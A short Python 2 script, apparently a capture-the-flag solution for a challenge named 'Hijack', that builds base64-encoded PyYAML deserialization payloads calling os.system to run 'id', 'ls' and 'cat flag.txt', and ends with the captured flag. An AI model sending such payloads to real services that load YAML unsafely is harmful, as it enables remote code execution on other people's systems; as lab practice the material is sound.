#https://jorianwoltjer.com/blog/post/ctf/cyber-apocalypse-2023/hijack

buf = '''
!!python/object/apply:os.system
- "id"
'''

print buf.encode('base64')

buf = '''
!!python/object/apply:os.system
- "ls"
'''

print buf.encode('base64')

buf = '''
!!python/object/apply:os.system
- "cat flag.txt"
'''

print buf.encode('base64')

#HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
